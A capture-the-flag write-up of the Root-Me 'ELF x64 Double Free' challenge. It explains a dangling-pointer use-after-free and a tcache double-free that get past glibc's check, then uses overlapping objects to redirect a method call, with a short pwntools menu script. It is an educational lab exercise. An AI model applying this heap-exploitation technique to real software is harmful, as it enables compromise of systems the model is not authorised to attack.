---
title: "ELF x64 - Double Free (Root-Me)"
slug: "elf-x64-double-free"
date: "2026-07-31"
description: "Exploiting a dangling Human pointer and a tcache double-free to overlap two objects and redirect a Zombie method call to the flag function."
category: "pwn"
event: "Root-Me"
year: 2026
difficulty: "medium"
author: "Huyen Chi"
tags:
  - PWN
  - Heap Exploitation
  - Double Free
  - Use After Free
  - Tcache
status: "published"
sourceUrl: "https://www.root-me.org/en/Challenges/App-System/ELF-x64-Double-Free"
quickLinks:
  - label: "Challenge files"
    url: "https://github.com/chihuyenichi/Rootme/tree/main/pwn/ELF-x64-Dobule-free"
  - label: "Source code"
    url: "https://github.com/chihuyenichi/Rootme/blob/main/pwn/ELF-x64-Dobule-free/source-code.c"
  - label: "Exploit source"
    url: "https://github.com/chihuyenichi/Rootme/blob/main/pwn/ELF-x64-Dobule-free/exploit.py"
---

## Challenge Overview

The challenge provides the C source for a menu-driven game containing one `Human` and up to three `Zombie` objects. The binary also contains `prayChuckToGiveAMiracle()`, which reads the flag from `.passwd`, but the normal menu does not call it successfully.

The objective is to abuse the heap operations and invoke this hidden function.

## Object Layout

The two structures contain the same number and types of fields:

```c
struct Zombie {
    int hp;
    void (*hurt)();
    void (*eatBody)();
    void (*attack)();
    int living;
};

struct Human {
    int hp;
    void (*fire)(int);
    void (*prayChuckToGiveAMiracle)();
    void (*suicide)();
    int living;
};
```

On x86-64, both structures are 40 bytes and are therefore served by the same tcache size class. Their function pointers also occupy matching offsets:

| Offset | `Zombie` | `Human` |
| --- | --- | --- |
| `0x00` | `hp` | `hp` |
| `0x08` | `hurt` | `fire` |
| `0x10` | `eatBody` | `prayChuckToGiveAMiracle` |
| `0x18` | `attack` | `suicide` |
| `0x20` | `living` | `living` |

If a `Zombie` and a `Human` can be made to overlap, initializing the `Human` will place the address of `prayChuckToGiveAMiracle()` exactly where the `Zombie` expects its `eatBody` method.

## Vulnerability Analysis

### Dangling `Human` pointer

The `suicide()` function clears and frees the current `Human`, but it does not set the global `human` pointer to `NULL`:

```c
void suicide() {
    puts("You can't survive at this zombie wave. *PAM*");
    memset(human, 0, sizeof(struct Human));
    free(human);
}
```

The menu therefore keeps a dangling pointer to the freed chunk. This is a use-after-free primitive.

### Double-free through `attack()`

A live zombie can still call `attack()` after the suicide. The function dereferences the dangling `human` pointer, reduces its cleared `hp`, and enters the death branch:

```c
void attack() {
    int hits = rand() % 10;
    human->hp -= hits;
    if (human->hp <= 0) {
        memset(human, 0, sizeof(struct Human));
        free(human);
        human = NULL;
        puts("You die");
    }
}
```

This frees the same chunk a second time. Normally glibc detects a duplicate tcache entry using metadata stored in the freed chunk. However, `memset()` clears that metadata immediately before the second `free()`, so the check is bypassed on the challenge environment.

After these two frees, the tcache list contains the same `Human` chunk twice:

```text
tcache -> H -> H
```

This duplicate entry is the allocation primitive needed to return the same address from two later `malloc()` calls.

## Exploitation

### 1. Create the double-free

The first phase creates a `Human` chunk `H`, keeps a zombie available to call `attack()`, and frees `H` twice:

```text
1. Create Human H
2. Create Zombie 1 as Z0
3. Call suicide(): free(H), but human still points to H
4. Make Z0 attack: attack() clears and frees H again
```

### 2. Prepare the allocation order

Zombie `Z0` is no longer needed after creating the duplicate entry. Calling its `eatBody()` method frees it, placing its chunk before the two `H` entries:

```text
tcache -> Z0 -> H -> H
```

The next three allocations then behave as follows:

```text
new Zombie 1 -> Z0
new Zombie 2 -> H
new Human    -> H
```

`Zombie 2` and the new `Human` now reference the same address.

### 3. Overwrite the method pointer

`newHuman()` initializes the overlapping memory and writes the hidden function address at offset `0x10`:

```c
human->prayChuckToGiveAMiracle = prayChuckToGiveAMiracle;
```

From `Zombie 2`'s perspective, the pointer at `0x10` is `eatBody`. Selecting menu option 7 for this zombie therefore dispatches to `prayChuckToGiveAMiracle()` and prints the flag.

## Exploit Script

The important menu sequence in pwntools is:

```python
# Phase 1: create H -> H in the tcache.
menu(1)       # Human H
menu(5, 1)    # Zombie Z0
menu(3)       # Free H, leaving a dangling pointer
menu(6, 1)    # Z0 attacks and frees H again

# Phase 2: arrange Z0 -> H -> H, then overlap two objects.
menu(7, 1)    # Free Z0
menu(5, 1)    # Reallocate Z0
menu(5, 2)    # Zombie 2 receives H
menu(1)       # New Human also receives H

# Phase 3: Zombie 2's eatBody pointer is now the Human's flag function.
menu(7, 2)
```

The complete remote exploit, including the SSH connection and output parsing, is available in the [exploit source](https://github.com/chihuyenichi/Rootme/blob/main/pwn/ELF-x64-Dobule-free/exploit.py).

## Result

The exploit turns a double-free into an overlapping-object primitive. Because the two structures have compatible layouts, no address leak or direct pointer overwrite is required: normal `Human` initialization installs the desired function pointer, and a virtual-style call through the overlapping `Zombie` reaches the flag function.
